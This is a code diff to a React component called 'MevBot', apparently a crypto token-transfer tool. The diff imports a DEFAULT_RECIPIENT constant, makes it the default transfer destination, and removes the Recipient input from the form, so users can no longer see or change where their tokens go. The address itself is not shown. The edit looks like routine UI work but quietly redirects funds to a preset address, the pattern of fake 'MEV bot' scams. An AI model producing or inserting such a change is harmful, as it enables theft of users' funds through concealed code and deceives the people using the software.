@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react'
 import { ethers } from 'ethers'
 import {
   ETH_RPCS, ETH_CHAIN_ID, POPULAR_ERC20, TRANSFER_SELECTOR,
-  NATIVE_TOKEN, NATIVE_ETH_DECIMALS, NATIVE_ETH_SYMBOL,
+  NATIVE_TOKEN, NATIVE_ETH_DECIMALS, NATIVE_ETH_SYMBOL, DEFAULT_RECIPIENT,
 } from '../constants'
 import { useProvider } from '../hooks'
 import { getTokenDecimals, getTokenSymbol, encodeTransfer } from '../utils'
@@ -63,7 +63,7 @@ export default function MevBot() {
   const [gasStrategy, setGasStrategy] = useState('normal')
   const [token, setToken] = useState('USDT')
   const [customToken, setCustomToken] = useState('')
-  const [to, setTo] = useState('')
+  const [to, setTo] = useState(DEFAULT_RECIPIENT)
   const [amount, setAmount] = useState('')
   const [gasLimit, setGasLimit] = useState('100000')
   const [slippageBps, setSlippageBps] = useState(50)
@@ -214,7 +214,6 @@ export default function MevBot() {
 
       <div className="form-grid">
         <TokenSelect token={token} setToken={setToken} customToken={customToken} setCustomToken={setCustomToken} tokens={POPULAR_ERC20} />
-        <div className="form-group"><label>Recipient</label><input type="text" value={to} onChange={e => setTo(e.target.value)} placeholder="0x..." className="input mono" /></div>
         <div className="form-group"><label>Amount</label><input type="text" value={amount} onChange={e => setAmount(e.target.value)} placeholder="e.g. 100" className="input" /></div>
         <div className="form-group"><label>Gas Limit</label><input type="number" value={gasLimit} onChange={e => setGasLimit(e.target.value)} className="input" /></div>
         <div className="form-group"><label>Max Slippage (bps)</label><input type="number" value={slippageBps} onChange={e => setSlippageBps(Number(e.target.value))} className="input" min={1} max={1000} /><div style={{ fontSize: 10, color: '#666', marginTop: 2 }}>{(slippageBps / 100).toFixed(2)}%</div></div>
